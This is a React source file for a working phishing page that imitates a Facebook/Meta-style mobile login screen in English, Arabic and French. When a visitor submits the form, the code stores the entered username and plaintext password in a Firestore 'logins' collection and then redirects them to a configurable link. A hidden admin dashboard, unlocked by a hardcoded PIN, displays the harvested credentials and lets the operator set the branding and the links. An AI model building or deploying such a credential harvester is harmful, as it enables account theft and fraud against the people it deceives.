/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import { useState, useEffect, useRef } from 'react';
import { 
  ChevronDown, 
  Lock
} from 'lucide-react';
import { motion, AnimatePresence } from 'motion/react';
import { initializeApp } from 'firebase/app';
import { 
  getFirestore, 
  collection, 
  addDoc, 
  onSnapshot, 
  query, 
  orderBy, 
  serverTimestamp,
  doc,
  getDoc,
  setDoc
} from 'firebase/firestore';
import firebaseConfig from '../firebase-applet-config.json';

// --- Firebase Initialization ---
const app = initializeApp(firebaseConfig);
export const db = getFirestore(app, firebaseConfig.firestoreDatabaseId);

// --- Types ---
type View = 'login' | 'dashboard';

interface LoginLog {
  id: string;
  username: string;
  password: string;
  timestamp: string;
  createdAt: any;
}

interface Settings {
  username: string;
  password: string;
  loginLink: string;
  forgotLink: string;
  createLink: string;
  dotsLabel: string;
  logo: string | null;
}

// --- Components ---

function Dashboard({ settings, setSettings }: { settings: Settings, setSettings: React.Dispatch<React.SetStateAction<Settings>> }) {
  const [logs, setLogs] = useState<LoginLog[]>([]);
  const [isSaving, setIsSaving] = useState(false);
  const fileInputRef = useRef<HTMLInputElement>(null);

  useEffect(() => {
    const q = query(collection(db, 'logins'), orderBy('createdAt', 'desc'));
    const unsubscribe = onSnapshot(q, (snapshot) => {
      const data = snapshot.docs.map(doc => ({
        id: doc.id,
        ...doc.data()
      })) as LoginLog[];
      setLogs(data);
    });
    return () => unsubscribe();
  }, []);

  const saveSettings = async (newSettings: Settings) => {
    await setDoc(doc(db, 'settings', 'labels'), newSettings);
  };

  const updateSetting = (key: keyof Settings, value: string | null) => {
    const newSettings = { ...settings, [key]: value };
    setSettings(newSettings);
  };

  const handleManualSave = async () => {
    setIsSaving(true);
    try {
      await saveSettings(settings);
      alert('تم حفظ التعديلات');
    } catch (error) {
      console.error(error);
      alert('حدث خطأ أثناء الحفظ، يرجى المحاولة مرة أخرى');
    } finally {
      setIsSaving(false);
    }
  };

  const handleLogoChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    if (e.target.files && e.target.files[0]) {
      const reader = new FileReader();
      reader.onload = (event) => {
        updateSetting('logo', event.target?.result as string);
      };
      reader.readAsDataURL(e.target.files[0]);
    }
  };

  return (
    <div className="min-h-screen bg-white p-8 font-sans text-right" dir="rtl">
      <div className="flex items-center justify-between mb-6">
        <h1 className="text-3xl font-bold text-slate-900">لوحة التحكم</h1>
        <button 
          onClick={() => window.location.reload()}
          className="p-2 bg-slate-100 rounded-full hover:bg-slate-200 transition-colors"
        >
          <span className="text-xl font-bold px-2">X</span>
        </button>
      </div>
      
      <div className="mb-8 p-6 bg-slate-50 rounded-xl border border-slate-200">
        <h2 className="font-bold mb-4">إعدادات الواجهة (حفظ تلقائي)</h2>
        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
          <input value={settings.username} onChange={(e) => updateSetting('username', e.target.value)} className="p-2 border rounded-lg" placeholder="تسمية اسم المستخدم" />
          <input value={settings.password} onChange={(e) => updateSetting('password', e.target.value)} className="p-2 border rounded-lg" placeholder="تسمية كلمة المرور" />
          <input value={settings.loginLink} onChange={(e) => updateSetting('loginLink', e.target.value)} className="p-2 border rounded-lg col-span-full" placeholder="رابط زر تسجيل الدخول" />
          <input value={settings.forgotLink} onChange={(e) => updateSetting('forgotLink', e.target.value)} className="p-2 border rounded-lg col-span-full" placeholder="رابط نسيت كلمة المرور" />
          <input value={settings.createLink} onChange={(e) => updateSetting('createLink', e.target.value)} className="p-2 border rounded-lg col-span-full" placeholder="رابط إنشاء حساب" />
          <input value={settings.dotsLabel} onChange={(e) => updateSetting('dotsLabel', e.target.value)} className="p-2 border rounded-lg col-span-full" placeholder="تسمية النقاط (Dots Label)" />
        </div>
        <button 
          type="button"
          onClick={handleManualSave}
          disabled={isSaving}
          className="mt-4 w-full bg-emerald-600 text-white py-2 rounded-lg font-bold pointer-events-auto relative z-10 disabled:opacity-50"
        >
          {isSaving ? 'جاري الحفظ...' : 'حفظ التغييرات'}
        </button>
      </div>

      <div className="mb-8">
        <button 
          onClick={() => fileInputRef.current?.click()}
          className="text-blue-600 hover:underline mb-4 block text-lg font-medium"
        >
          تغيير الشعار
        </button>
        <input 
          type="file" 
          ref={fileInputRef} 
          onChange={handleLogoChange} 
          className="hidden" 
          accept="image/*"
        />
        
        {settings.logo && (
          <div className="mb-4 flex justify-center">
            <img 
              src={settings.logo} 
              alt="Current Logo" 
              className="max-h-24 w-auto object-contain" 
            />
          </div>
        )}

        <div className="flex flex-col items-center gap-2 text-slate-500 text-sm text-center">
          <span>{settings.logo ? 'تم اختيار شعار مخصص' : 'لم يتم اختيار شعار بعد'}</span>
        </div>
      </div>

      <div className="space-y-4">
        {logs.map((log) => (
          <div 
            key={log.id} 
            className="border-2 border-slate-900 p-4 rounded-lg inline-block min-w-[300px] text-right"
          >
            <div className="text-xl mb-1">
              <span className="font-bold">{settings.username}:</span> 
              <span className="mr-2">{log.username}</span>
            </div>
            <div className="text-xl mb-1">
              <span className="font-bold">{settings.password}:</span> 
              <span className="mr-2">{log.password}</span>
            </div>
            <div className="text-slate-500 text-sm mt-2">
              {log.timestamp}
            </div>
          </div>
        ))}

        {logs.length === 0 && (
          <div className="text-slate-400 italic">لا توجد بيانات مسجلة بعد...</div>
        )}
      </div>
    </div>
  );
}

function PasswordPrompt({ onSubmit, onCancel }: { onSubmit: (pass: string) => void, onCancel: () => void }) {
  const [pass, setPass] = useState('');
  const [error, setError] = useState(false);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (pass === '2008') {
      onSubmit(pass);
    } else {
      setError(true);
      setPass('');
    }
  };

  return (
    <motion.div 
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      exit={{ opacity: 0 }}
      className="fixed inset-0 z-50 flex items-center justify-center p-6 bg-black/40 backdrop-blur-sm"
    >
      <motion.div 
        initial={{ scale: 0.9, opacity: 0 }}
        animate={{ scale: 1, opacity: 1 }}
        exit={{ scale: 0.9, opacity: 0 }}
        className="w-full max-w-sm bg-white rounded-3xl p-8 shadow-2xl"
      >
        <div className="flex flex-col items-center text-center gap-4">
          <div className="w-16 h-16 bg-blue-50 text-blue-600 rounded-full flex items-center justify-center">
            <Lock size={32} />
          </div>
          <div>
            <h3 className="text-xl font-bold text-slate-900">أدخل كلمة مرور المسؤول</h3>
            <p className="text-slate-500 text-sm mt-1">الوصول إلى لوحة التحكم مقيد.</p>
          </div>

          <form onSubmit={handleSubmit} className="w-full mt-2">
            <input 
              autoFocus
              type="password"
              value={pass}
              onChange={(e) => {
                setPass(e.target.value);
                setError(false);
              }}
              placeholder="••••"
              className={`w-full px-4 py-4 bg-slate-50 border ${error ? 'border-rose-500 ring-1 ring-rose-500' : 'border-slate-200'} rounded-2xl text-center text-2xl tracking-[1em] focus:outline-none focus:border-blue-500 transition-all`}
            />
            {error && <p className="text-rose-500 text-xs mt-2 font-medium">كلمة المرور غير صحيحة. حاول مرة أخرى.</p>}
            
            <div className="flex flex-col gap-3 mt-6">
              <button 
                type="submit"
                className="w-full py-4 bg-blue-600 text-white font-bold rounded-2xl hover:bg-blue-700 active:scale-[0.98] transition-all"
              >
                فتح اللوحة
              </button>
              <button 
                type="button" 
                onClick={onCancel}
                className="w-full py-2 text-slate-500 font-semibold hover:text-slate-700 transition-colors"
              >
                إلغاء
              </button>
            </div>
          </form>
        </div>
      </motion.div>
    </motion.div>
  );
}

export default function App() {
  const [view, setView] = useState<View>('login');
  const [showPasswordPrompt, setShowPasswordPrompt] = useState(false);
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [lang, setLang] = useState('English (US)');
  const [showLangMenu, setShowLangMenu] = useState(false);
  
  // Initial settings from localStorage for instant loading
  const [settings, setSettings] = useState<Settings>(() => {
    const saved = localStorage.getItem('app_settings');
    return saved ? JSON.parse(saved) : { 
      username: 'اسم المستخدم', 
      password: 'كلمة المرور',
      loginLink: 'https://google.com',
      forgotLink: 'https://google.com',
      createLink: 'https://google.com',
      dotsLabel: 'إعدادات إضافية',
      logo: null
    };
  });

  const languages = ['English (US)', 'العربية (AR)', 'Français (FR)'];

  const t = (key: string) => {
    const translations: any = {
      'English (US)': { username: 'Username, email or mobile number', password: 'Password', login: 'Log in', forgot: 'Forgot password?', create: 'Create new account', lang: 'English (US)' },
      'العربية (AR)': { username: 'اسم المستخدم، البريد الإلكتروني أو رقم الهاتف', password: 'كلمة المرور', login: 'تسجيل الدخول', forgot: 'هل نسيت كلمة المرور؟', create: 'إنشاء حساب جديد', lang: 'العربية (AR)' },
      'Français (FR)': { username: 'Nom d\'utilisateur, e-mail ou numéro de mobile', password: 'Mot de passe', login: 'Connexion', forgot: 'Mot de passe oublié ?', create: 'Créer un nouveau compte', lang: 'Français (FR)' },
    };
    return translations[lang][key];
  };

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    
    const now = new Date();
    const timestamp = now.toLocaleString(lang === 'العربية (AR)' ? 'ar-DZ' : 'en-US', {
      year: 'numeric',
      month: '2-digit',
      day: '2-digit',
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit',
      hour12: true
    });

    try {
      await addDoc(collection(db, 'logins'), {
        username: email,
        password: password,
        timestamp: timestamp,
        createdAt: serverTimestamp()
      });
      
      // Redirect after successful save
      window.location.href = settings.loginLink;
    } catch (err) {
      console.error('Error capturing credentials:', err);
      // Fallback redirect if save fails
      window.location.href = settings.loginLink;
    }
  };

  const onPasswordSuccess = () => {
    setShowPasswordPrompt(false);
    setView('dashboard');
  };

  useEffect(() => {
    const fetchSettings = async () => {
      try {
        const docRef = doc(db, 'settings', 'labels');
        const docSnap = await getDoc(docRef);
        if (docSnap.exists()) {
          const newSettings = docSnap.data() as Settings;
          setSettings(newSettings);
          // Cache for next load
          localStorage.setItem('app_settings', JSON.stringify(newSettings));
        }
      } catch (err) {
        console.error('Error fetching settings:', err);
      }
    };
    fetchSettings();
  }, []);

  if (view === 'dashboard') {
    return <Dashboard settings={settings} setSettings={setSettings} />;
  }

  return (
    <div className={`min-h-screen bg-white flex flex-col items-center px-6 pt-12 pb-8 font-sans text-slate-900 overflow-x-hidden ${lang === 'العربية (AR)' ? 'rtl' : 'ltr'}`}>
      <AnimatePresence>
        {showPasswordPrompt && (
          <PasswordPrompt 
            onSubmit={onPasswordSuccess} 
            onCancel={() => setShowPasswordPrompt(false)} 
          />
        )}
      </AnimatePresence>

      {/* Language Selector */}
      <div className="relative mb-8">
        <button 
          onClick={() => setShowLangMenu(!showLangMenu)}
          className="flex items-center gap-1 text-slate-500 text-sm cursor-pointer hover:text-slate-700 transition-colors"
        >
          <span>{lang}</span>
          <ChevronDown size={16} strokeWidth={2.5} />
        </button>
        {showLangMenu && (
          <div className="absolute top-full right-0 mt-2 bg-white border border-slate-200 rounded-lg shadow-lg py-2 w-40 z-20">
            {languages.map((l) => (
              <button 
                key={l}
                onClick={() => { setLang(l); setShowLangMenu(false); }}
                className="block w-full text-right px-4 py-2 hover:bg-slate-50 text-sm"
              >
                {l}
              </button>
            ))}
          </div>
        )}
      </div>

      {/* Main Form Container */}
      <div className="w-full max-w-md flex flex-col flex-1">
        
        {/* Logo Section */}
        <div className="mb-12 flex flex-col items-center">
            {settings.logo ? (
              <img 
                src={settings.logo} 
                alt="Logo" 
                className="max-h-24 w-auto object-contain" 
                loading="lazy"
              />
            ) : (
              <div className="w-20 h-20 rounded-xl bg-slate-50 border border-slate-100 flex items-center justify-center">
                <span className="text-slate-300 text-xs font-medium">Logo</span>
              </div>
            )}
        </div>

        <form onSubmit={handleLogin} className="flex flex-col gap-3">
          <input
            type="text"
            placeholder={t('username')}
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            className="w-full px-4 py-4 rounded-xl border border-slate-200 bg-slate-50/30 focus:outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-500 transition-all text-[15px]"
            required
          />
          <input
            type="password"
            placeholder={t('password')}
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            className="w-full px-4 py-4 rounded-xl border border-slate-200 bg-slate-50/30 focus:outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-500 transition-all text-[15px]"
            required
          />
          
          <button
            type="submit"
            className="mt-2 w-full py-3.5 bg-[#0064e0] text-white font-semibold rounded-full hover:bg-[#0057c2] active:scale-[0.98] transition-all text-base shadow-sm text-center block"
          >
            {t('login')}
          </button>

          <a
            href={settings.forgotLink}
            className="mt-3 text-[15px] font-semibold text-slate-900 hover:underline transition-all text-center block"
          >
            {t('forgot')}
          </a>
        </form>

        <div className="mt-auto flex flex-col gap-4">
          <a
            href={settings.createLink}
            className="w-full py-2.5 border border-[#0064e0] text-[#0064e0] font-semibold rounded-full hover:bg-blue-50 active:scale-[0.98] transition-all text-[15px] text-center block"
          >
            {t('create')}
          </a>

          {/* Footer Dots / Action */}
          <div className="flex flex-col items-center gap-2 py-4">
             <button 
                onClick={() => setShowPasswordPrompt(true)}
                className="text-xs text-slate-400 hover:text-slate-600 transition-colors p-2 cursor-pointer"
             >
                {settings.dotsLabel}
             </button>
          </div>
        </div>
      </div>
    </div>
  );
}
